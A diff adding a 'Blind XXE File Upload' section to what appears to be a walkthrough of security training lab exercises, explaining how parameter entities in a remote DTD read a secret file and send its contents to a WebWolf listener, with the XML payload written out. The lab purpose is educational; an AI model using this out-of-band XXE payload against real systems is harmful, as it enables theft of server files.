@@ -206,3 +206,27 @@ This basically loads the remote DTD file and replaces the `%remote;` placeholder
 </comment>
 ```
 
+## Blind XXE File Upload
+
+Take a look at the [`webwolf/attack-secret.dtd`](./webwolf/attack-secret.dtd) to see what is being loaded remotely from the webwolf server in the XML payload below.
+
+The challenge really is to get the contents of the secret file into a variable and place that into a external entity as part of the url request to WebWolf.
+
+The way we achieve this is with Parameter Entities. In the [`webwolf/attack-secret.dtd`](./webwolf/attack-secret.dtd) file we use a parameter entity to load the secret then we use a second parameter entity to build the final entity tag that we want using a string that contains the `%secret;` reference.
+
+Finally the second parameter entity is output which resolves to the enitiy we need to log the secret file contents in WebWolf:
+
+`<!ENTITY upload SYSTEM 'http://webwolf:8081/landing?text=the+contents+of+secret'>`
+
+We can then load the remote DTD from WebWolf (using another parameter entitiy) and call the `upload` entity by injecting it in the XML body, like so:
+
+```
+<?xml version="1.0"?>
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "http://webwolf:8081/files/darren/attack-secret.dtd">
+%remote;
+]>
+<comment>
+  <text>test&upload;</text>
+</comment>
+```
